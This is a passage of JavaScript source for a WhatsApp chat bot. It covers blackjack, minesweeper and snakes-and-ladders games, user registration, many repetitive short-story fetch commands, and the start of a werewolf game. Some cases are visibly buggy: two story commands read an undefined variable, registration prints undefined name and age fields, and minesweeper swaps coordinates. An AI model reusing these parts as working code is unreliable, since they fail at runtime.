                }
                break;

            case 'start':
                if (David.blackjack[m.chat]) {
                    await reply(`*A blackjack session is already in progress.* Use *${prefix + command} end* to exit the session.`);
                } else {
                    David.blackjack[m.chat] = new Blackjack(1);
                    David.blackjack[m.chat].idPemain = m.sender;
                    let betAmount = argumen ? parseInt(argumen) : 1000;
                    David.blackjack[m.chat].placeBet(betAmount);
                    David.blackjack[m.chat].start();
                    const table = David.blackjack[m.chat];
                    const pesanStart = templateBlackjackMessage(prefix, command, David, m, table);
                    await reply(pesanStart);
                }
                break;

            case 'hit':
                if (!David.blackjack[m.chat] || David.blackjack[m.chat]?.idPemain !== m.sender) {
                    await reply('*You are not playing blackjack or you are not a player*');
                    break;
                }
                David.blackjack[m.chat].hit();
                const tableHit = David.blackjack[m.chat];
                const pesanHit = templateBlackjackMessage(prefix, command, David, m, tableHit);
                await reply(pesanHit);
                break;

            case 'stand':
                if (!David.blackjack[m.chat] || David.blackjack[m.chat]?.idPemain !== m.sender) {
                    await reply('*You are not playing blackjack or you are not a player.*');
                    break;
                }
                David.blackjack[m.chat].stand();
                const tableStand = David.blackjack[m.chat];
                const pesanStand = templateBlackjackMessage(prefix, command, David, m, tableStand);
                await reply(pesanStand);
                break;

            case 'double':
                if (!David.blackjack[m.chat] || David.blackjack[m.chat]?.idPemain !== m.sender) {
                    await reply('*You are not playing blackjack or you are not a player.*');
                    break;
                }
                David.blackjack[m.chat].doubleDown();
                const tableDouble = David.blackjack[m.chat];
                const pesanDouble = templateBlackjackMessage(prefix, command, David, m, tableDouble);
                await reply(pesanDouble);
                break;

            default:
                await reply(`*Invalid command.*\nUse *${prefix + command} start* to start a blackjack session.`);
                break;
        }
    } catch (err) {
        console.error(err);
        await reply('*An error occurred while processing the command.*');
    }
}
break
case 'msp': {
  const generate = (x, y, bombs) => {
    const field = Array.from({
        length: x
    }, () => Array(y).fill(0));

    for (let i = 0; i < bombs; i++) {
        let xBomb, yBomb;
        do {
            xBomb = Math.floor(Math.random() * x);
            yBomb = Math.floor(Math.random() * y);
        } while (field[xBomb][yBomb] === 'x');

        field[xBomb][yBomb] = 'x';
    }

    for (let i = 0; i < x; i++) {
        for (let j = 0; j < y; j++) {
            if (field[i][j] !== 'x') {
                for (let k = -1; k <= 1; k++) {
                    for (let l = -1; l <= 1; l++) {
                        const ni = i + k;
                        const nj = j + l;
                        if (ni >= 0 && ni < x && nj >= 0 && nj < y && field[ni][nj] === 'x') {
                            field[i][j]++;
                        }
                    }
                }
            }
        }
    }

    return field;
};

const generateEmpty = (x, y) => Array.from({
    length: x
}, () => Array(y).fill(0));

const translate = (value) => {
    switch (value) {
        case 0:
            return '⬜';
        case 1:
            return '1️⃣';
        case 2:
            return '2️⃣';
        case 3:
            return '3️⃣';
        case 4:
            return '4️⃣';
        case 5:
            return '5️⃣';
        case 6:
            return '6️⃣';
        case 7:
            return '7️⃣';
        case 8:
            return '8️⃣';
        case 'x':
            return '💣';
        case 'e':
            return '⏹️';
        case 'f':
            return '🚩';
    }
};

const generateString = (map) => map.map(row => row.map(cell => translate(cell)).join('')).join('\n');

const detectZero = (map, x, y) => {
    const queue = [
        [x, y]
    ];
    const result = [];
    const visited = new Set();

    while (queue.length > 0) {
        const [cx, cy] = queue.shift();
        if (!visited.has(`${cx},${cy}`)) {
            visited.add(`${cx},${cy}`);
            result.push([cx, cy]);

            if (map[cx][cy] === 0) {
                for (let i = -1; i <= 1; i++) {
                    for (let j = -1; j <= 1; j++) {
                        const ni = cx + i;
                        const nj = cy + j;
                        if (ni >= 0 && ni < map.length && nj >= 0 && nj < map[0].length) {
                            queue.push([ni, nj]);
                        }
                    }
                }
            }
        }
    }

    return result;
};

    David.minessweeper = David.minessweeper || {};
    const orgs = args[0];
    const oX = args[1];
    const oY = args[2];
    const F = args[3];
    const x = 10;
    const y = 10;
    const bombs = 15;

    if (!orgs) {
        return reply(`🕹️ *Minesweeper Game* 🕹️\n*▶️ ${prefix + command} go* - Start the Game\n*🔓 ${prefix + command} open* - Open a cell\n*🔽 ${prefix + command} surrender* - Surrender\n\n*Example:* ${prefix + command} go`);
    }

    switch (orgs.toLowerCase()) {
        case "go":
        case "start":
            const map = generate(x, y, bombs);
            const empty = generateEmpty(x, y);
            const {
                key
            } = await reply('🕹️ *Minesweeper Game* 🕹️\n\n*Board*\n' + generateString(empty));
            David.minessweeper[m.chat] = {
                'map': map,
                'current': empty,
                'key': key
            };
            return;

        case "surrender":
        case "stop":
        case "end":
            if (!David.minessweeper[m.chat]) {
                return reply('🚨 *No active game session.*');
            }
            delete David.minessweeper[m.chat];
            return reply('🏳️ *You surrendered.*');

        case "open":
        case "o":
        case "buka":
            if (!David.minessweeper[m.chat]) {
                return reply('🚨 *No active game session.*');
            }
            if (oX > 10 || !oX || !oY) {
                return reply(`🚨 *Invalid parameters. Example: ${prefix + command} open 2 5*`);
            }

            const g = David.minessweeper[m.chat];

            if (F === 'f') {
                g.current[oY - 1][oX - 1] = '🚩';
            } else {
                const openedCell = g.map[oX - 1][oY - 1];

                if (openedCell === 0) {
                    const zero = detectZero(g.map, oX - 1, oY - 1);
                    for (const coords of zero) {
                        g.current[coords[0]][coords[1]] = g.map[coords[0]][coords[1]];
                    }
                } else if (openedCell === 'x') {
                    delete David.minessweeper[m.chat];
                    const {
                        key: loseKey
                    } = await reply('💥 *BOOM!* 💣 *You opened a bomb.*');
                    David.minessweeper[m.chat] = {
                        'key': loseKey
                    };
                    return;
                } else {
                    g.current[oY - 1][oX - 1] = openedCell;
                }
            }

            await David.sendMessage(m.chat, {
                delete: g.key
            });

            const {
                key: newKey
            } = await reply('🕹️ *Minesweeper Game* 🕹️\n\n*Board*\n' + generateString(g.current));
            David.minessweeper[m.chat].key = newKey;
            return;
    }
};
break
case 'ulartangga': {
  class SnakeAndLadderGame {
    constructor(sMsg) {
        this.sendMsg = sMsg;
        this.players = [];
        this.boardSize = 100;
        this.snakesAndLadders = [{
                start: 29,
                end: 7
            }, {
                start: 24,
                end: 12
            }, {
                start: 15,
                end: 37
            },
            {
                start: 23,
                end: 41
            }, {
                start: 72,
                end: 36
            }, {
                start: 49,
                end: 86
            },
            {
                start: 90,
                end: 56
            }, {
                start: 75,
                end: 64
            }, {
                start: 74,
                end: 95
            },
            {
                start: 91,
                end: 72
            }, {
                start: 97,
                end: 78
            }
        ];
        this.currentPositions = {};
        this.currentPlayerIndex = 0;
        this.bgImageUrl = 'https://i.pinimg.com/originals/2f/68/a7/2f68a7e1eee18556b055418f7305b3c0.jpg';
        this.playerImageUrls = {
            red: 'https://telegra.ph/file/86fd8ea9311e2bc99ae63.jpg',
            green: 'https://dkonten.com/studio/wp-content/uploads/sites/19/2023/05/search-1.png'
        };
        this.bgImage = null;
        this.playerImages = {
            red: null,
            green: null
        };
        this.cellWidth = 40;
        this.cellHeight = 40;
        this.keyId = null;
        this.started = false;
    }

    initializeGame() {
        this.players.forEach(player => (this.currentPositions[player] = 1));
        this.currentPlayerIndex = 0;
        this.started = true;
    }

    rollDice = (num) => {
    return Array.from({ length: num }, () => Math.floor(Math.random() * 6) + 1)[Math.floor(Math.random() * num)];
};

    fetchImage = async (url) => {
        try {
            const response = await axios.get(url, {
                responseType: 'arraybuffer'
            });
            return await Jimp.read(Buffer.from(response.data, 'binary'));
        } catch (error) {
            console.error(`Error fetching image from ${url}:`, error);
            throw error;
        }
    };

    getBoardBuffer = async () => {
        const board = new Jimp(420, 420);
        this.bgImage.resize(420, 420);
        board.composite(this.bgImage, 0, 0);

        for (const player of this.players) {
            const {
                x,
                y
            } = this.calculatePlayerPosition(player);
            board.composite(await this.getPlayerImage(player), x, y);
        }

        return board.getBufferAsync(Jimp.MIME_PNG);
    };

    calculatePlayerPosition = (player) => {
        const playerPosition = this.currentPositions[player];
        const row = 9 - Math.floor((playerPosition - 1) / 10);
        const col = (playerPosition - 1) % 10;
        const x = col * this.cellWidth + 10;
        const y = row * this.cellHeight + 10;
        return {
            x,
            y
        };
    };

    getPlayerImage = async (player) => {
        const color = this.getPlayerColor(player);

        if (!this.playerImages[color]) {
            try {
                const image = await this.fetchImage(this.playerImageUrls[color]);
                this.playerImages[color] = image;
            } catch (error) {
                console.error(`Error fetching image for ${color} player:`, error);
                throw error;
            }
        }

        return this.playerImages[color].clone().resize(this.cellWidth, this.cellHeight);
    };

    getPlayerColor = (player) => (player === this.players[0] ? 'red' : 'green');

    startGame = async (m, player1Name, player2Name) => {
        await m.reply(`🐍🎲 *Selamat datang di Permainan Ular Tangga!* 🎲🐍 \n\n${this.formatPlayerName(player1Name)} *vs* ${this.formatPlayerName(player2Name)}`)

        this.players = [player1Name, player2Name];
        await this.initializeGame();

        if (!this.bgImage) this.bgImage = await this.fetchImage(this.bgImageUrl);

        const {
            key
        } = await David.sendMessage(m.chat,{image: await this.getBoardBuffer()});
        this.keyId = key;
    };

    formatPlayerName = (player) => {
        const color = this.getPlayerColor(player);
        return `@${player.split('@')[0]} ( ${color.charAt(0).toUpperCase() + color.slice(1)} )`;
    };

    playTurn = async (m, player) => {
        if (!this.players.length) return m.reply('🛑 *There are no active games.*\nUse "!snake start" to start a new game..');
        if (player !== this.players[this.currentPlayerIndex]) return m.reply(`🕒 *It's not your turn.* \n\nNow it's your turn ${this.formatPlayerName(this.players[this.currentPlayerIndex])}`);

        const diceRoll = this.rollDice(6);
        await David.sendMessage(m.chat, {image: {url: "https://i.pinimg.com/originals/2f/68/a7/2f68a7e1eee18556b055418f7305b3c0.jpg" }, caption: `🎲 ${this.formatPlayerName(player)} *roll the dice.*\n\n - Dice: *${diceRoll}*\n - From box: *${this.currentPositions[player]}*\n - To box: *${this.currentPositions[player] + diceRoll}*` }, {quoted: m});

        if (this.players.length === 0) return;

        const currentPosition = this.currentPositions[player];
        let newPosition = currentPosition + diceRoll;

        for (const otherPlayer of this.players) {
            if (otherPlayer !== player && this.currentPositions[otherPlayer] === newPosition) {
                const message = `😱 *Oh no!* ${this.formatPlayerName(player)} *steps into position* ${this.formatPlayerName(otherPlayer)}\n*Back to beginning of cell..*`;
                await m.reply(message);
                newPosition = 1;
            }
        }

        if (newPosition <= this.boardSize) {
            const checkSnakeOrLadder = this.snakesAndLadders.find((s) => s.start === this.currentPositions[player]);

            if (checkSnakeOrLadder) {
                const action = checkSnakeOrLadder.end < checkSnakeOrLadder.start ? 'Back' : 'Forward';
                await m.reply(`🐍 ${this.formatPlayerName(player)} find *${action === 'Back' ? 'snake' : 'ladder'}!*\n*${action}* to box *${checkSnakeOrLadder.end}*`);
                this.currentPositions[player] = checkSnakeOrLadder.end;
            } else {
                this.currentPositions[player] = newPosition;
            }

            if (this.currentPositions[player] === this.boardSize) {
                await m.reply(`🎉 ${this.formatPlayerName(player)} win!\n*Congratulations!*`);
                await this.resetSession();
                return;
            }

            if (diceRoll !== 6) {
                this.currentPlayerIndex = 1 - this.currentPlayerIndex;
            } else {
                await m.reply('🎲 *You got 6*\nSo your turn still continues.');
            }
        } else {
            await m.reply('🔄 Exceeding the box limit, the position is reset and the turn goes to the next player..');
            this.currentPositions[player] = 1;
            this.currentPlayerIndex = 1 - this.currentPlayerIndex;
        }

        const boardBuffer = await this.getBoardBuffer();
        const sendMsg = this.sendMsg;
        await sendMsg.sendMessage(m.chat, {
            delete: this.keyId
        });

        const {
            key
        } = await m.reply(boardBuffer);
        this.keyId = key;
    };

    addPlayer = (player) => this.players.length < 2 && !this.players.includes(player) && player !== '' && (this.players.push(player), true);

    resetSession = () => {
        this.players = [];
        this.currentPositions = {};
        this.currentPlayerIndex = 0;
        this.started = false;
    };

    isGameStarted = () => this.started;
}

class GameSession {
    constructor(id, sMsg) {
        this.id = id;
        this.players = [];
        this.game = new SnakeAndLadderGame(sMsg);
    }
}

    David.ulartangga = David.ulartangga || {};
    const sessions = (David.ulartangga_ = David.ulartangga_ || {});
    const sessionId = m.chat;
    const session = sessions[sessionId] || (sessions[sessionId] = new GameSession(sessionId, David));
    const game = session.game;
    const {
        state
    } = David.ulartangga[m.chat] || {
        state: false
    };

    switch (args[0]) {
        case 'join':
            if (state) return m.reply('🛑 *The game has started.*\nCannot join.');
            const playerName = m.sender;
            const joinSuccess = game.addPlayer(playerName);
            joinSuccess ? m.reply(`👋 ${game.formatPlayerName(playerName)} *join the game..*`) : m.reply('*You have already joined or the game is full.*\nCannot join.');
            break;

        case 'start':
            if (state) return m.reply('🛑 *The game has started.*\nCannot restart.');
            David.ulartangga[m.chat] = {
                ...David.ulartangga[m.chat],
                state: true
            };
            if (game.players.length === 2) {
                await game.startGame(m, game.players[0], game.players[1]);
                await m.reply('🛑 *The game has started.*\nCannot restart..');
                return;
            } else {
                await m.reply('👥 *There are not enough players to start the game.*\nA minimum of 2 players is required..');
                return;
            }
            break;

        case 'roll':
            if (!state) return m.reply(`🛑 *The game has not started yet.*\nType *${prefix + command} start* to start`);
            if (game.isGameStarted()) {
                const currentPlayer = game.players[game.currentPlayerIndex];
                if (m.sender !== currentPlayer) {
                    await m.reply(`🕒 *It's not your turn.* \n\nNow it's your turn ${game.formatPlayerName(currentPlayer)}`);
                    return;
                } else {
                    await game.playTurn(m, currentPlayer);
                    return;
                }
            } else {
                await m.reply(`🛑 *The game has not started yet.*\nType *${prefix + command} start* to start.`);
                return;
            }
            break;

        case 'reset':
            David.ulartangga[m.chat] = {
                ...David.ulartangga[m.chat],
                state: false
            };
            session.game.resetSession();
            delete sessions[sessionId];
            await m.reply('🔄 *Game session reset*');
            break;

        case 'help':
            await m.reply(`🎲🐍 *Snakes and Ladders Game* 🐍🎲\n\n*Commands:*\n- *${prefix + command} join :* Join the game.\n- *${prefix + command} start :* Start the game.\n- *${prefix + command} roll :* Roll the dice to move.\n- *${prefix + command} reset :* Reset the game session.`);
            break;

        default:
            m.reply(`❓ *Perintah tidak valid.*\nGunakan *${prefix + command} help* untuk melihat daftar perintah.`);
    }
};
break

case 'daftar':
                if (isRegistered) return reply('You are already registered')
                if (!q.includes('.')) return reply('Not like that Sis, Gini .register your name.your age.')
                const namaUser = q.substring(0, q.indexOf('.') - 0)
                const umurUser = q.substring(q.lastIndexOf('.') + 1)
                const serialUser = createSerial(20)
                if(isNaN(umurUser)) return reply('Age must be a number!!')
                if (namaUser.length >= 30) return reply(`why is your name so long it's a name or a train`)
                if (umurUser > 40) return reply(`your age is too  old maximum 40 years`)
                if (umurUser < 12) return reply(`your age is too young minimum 12 years`)
				mzd = `You have registered with the following information:\n\n⭔ Name : ${Username}\n⭔ Age : ${Userage}\n⭔ Phone Number : wa.me/${sender.split("@")[0]}\n⭔ NS : ${serialUser}`
                veri = m.sender
                if (!m.isGroup) {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    David.sendMessage(m.chat, {image: fkethmb, caption: mzd, contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `${pushname} Already Registered`,
                    body: `ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`,
                    sourceUrl: "",
                    thumbnail: fkethmb
                }
            }})
                    
                } else {
                    addRegisteredUser(m.sender, namaUser, umurUser, serialUser)
                    David.sendMessage(m.chat, {image: fkethmb, caption: mzd, contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L/${Math.floor(Math.random() * 100000000000000000)}`,
                    title: `${pushname} Already Registered`,
                    body: `Created by ${ownername}`,
                    sourceUrl: "",
                    thumbnail: fkethmb
                }
            }})
                    
                }
		break
case 'cerpen-anak':{
let hasil = await cerpen(`anak`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasadaerah':{
let hasil = await cerpen(`bahasa daerah`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasainggris':{
let hasil = await cerpen(`bahasa Inggris`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasajawa':{
let hasil = await cerpen(`bahasa jawa`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-bahasasunda':{
let hasil = await cerpen(`bahasa sunda`)
m.reply(`
 ❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-budaya':{
let hasil = await cerpen(`budaya`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cinta':{
let hasil = await cerpen(`cinta`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintaislami':{
let hasil = await cerpen(`cinta islami`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintapertama':{
let hasil = await cerpen(`cinta pertama`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintaromantis':{
let hasil = await cerpen(`cinta romantis`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasedih':{
let hasil = await cerpen(`cinta sedih`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasegitiga':{
let hasil = await cerpen(`Cinta segitiga`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-cintasejati':{
let hasil = await cerpen(`cinta sejati`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-galau':{
let hasil = await cerpen(`galau`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-gokil':{
let hasil = await cerpen(`gokil`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-inspiratif':{
let hasil = await cerpen(`inspiratif`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-jepang':{
let hasil = await cerpen(`jepang`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kehidupan':{
let hasil = await cerpen(`kehidupan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-keluarga':{
let hasil = await cerpen(`keluarga`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kisahnyata':{
let hasil = await cerpen(`kisah nyata`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-korea':{
let hasil = await cerpen(`korea`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-kristen':{
let hasil = await cerpen(`kristen`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-liburan':{
let hasil = await cerpen(`liburan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-malaysia':{
let hasil = await cerpen(`malaysia`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-mengharukan':{
let hasil = await cerpen(`mengharukan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-misteri':{
let hasil = await cerpen(`misteri`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-motivasi':{
let hasil = await cerpen(`motivasi`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-nasihat':{
let hasil = await cerpen(`nasihat`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-nasionalisme':{
let hasil = await cerpen(`nasionalisme`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-olahraga':{
let hasil = await cerpen(`olahraga`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-patahhati':{
let cerpe = await cerpen(`patah hati`)
reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-penantian':{
let hasil = await cerpen(`penantian`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pendidikan':{
let hasil = await cerpen(`pendidikan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pengalaman':{
let hasil = await cerpen(`pengalaman pribadi`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-pengorbanan':{
let hasil = await cerpen(`pengorbanan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-penyesalan':{
let hasil = await cerpen(`penyesalan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-perjuangan':{
let hasil = await cerpen(`perjuangan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-perpisahan':{
let hasil = await cerpen(`perpisahan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-persahabatan':{
let hasil = await cerpen(`persahabatan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-petualangan':{
let hasil = await cerpen(`petualangan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-ramadhan':{
let hasil = await cerpen(`ramadhan`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-remaja':{
let hasil = await cerpen(`remaja`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-rindu':{
let hasil = await cerpen(`rindu`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-rohani':{
let cerpe = await cerpen(`rohani`)
reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-romantis':{
let hasil = await cerpen(`romantis`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sastra':{
let hasil = await cerpen(`sastra`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sedih':{
let hasil = await cerpen(`sedih`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'cerpen-sejarah':{
let hasil = await cerpen(`sejarah`)
m.reply(`
❏ *Title*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`)
}
break
case 'wwpc':
case 'ww':
case 'werewolf': {
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
